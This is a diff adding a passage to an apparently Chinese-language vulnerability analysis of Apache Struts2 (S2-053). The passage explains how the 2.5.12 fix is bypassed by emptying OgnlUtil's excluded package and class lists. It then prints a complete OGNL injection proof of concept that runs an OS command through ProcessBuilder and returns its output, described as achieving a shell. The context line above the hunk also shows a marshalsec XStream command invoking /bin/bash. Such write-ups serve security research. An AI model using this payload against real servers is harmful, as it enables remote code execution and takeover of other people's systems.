@@ -1213,6 +1213,33 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream ImageIO "/bin/bash
 
 <img src="pic/struts2_s2-053_9.png">
 
+**但！很遗憾**，这个修复可以被轻易绕过，因为修复后的代码中，`OgnlUtil`类里的`excludedPackageNames`和`excludedClasses`属性，只是它引用的集合对象是一个不可修改的对象，故可通过它们的`setter`方法，将其引用到一个空集合对象即可。
+
+这里直接放结论：将在上面的可回显PoC稍加修改，然后连续执行两次，便可在修复后的Struts2 `2.5.12`版本getshell！至于为什么需要执行两次才行，这个留到分析S2-057漏洞时再好好说道。
+修改后的PoC如下：
+
+```
+%{
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#_memberAccess?(#_memberAccess=#dm):
+		(
+		(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+		(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+		(#ognlUtil.setExcludedPackageNames('')).
+		(#ognlUtil.setExcludedClasses('')).
+		(#context.setMemberAccess(#dm)))).
+(#cmd='id').
+(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
+(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
+(#p=new java.lang.ProcessBuilder(#cmds)).
+(#p.redirectErrorStream(true)).
+(#process=#p.start()).
+(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))
+}
+```
+
+<img src="pic/struts2_s2-053_10.png">
+
 <a name="s2-057"></a>
 ## S2-057
 
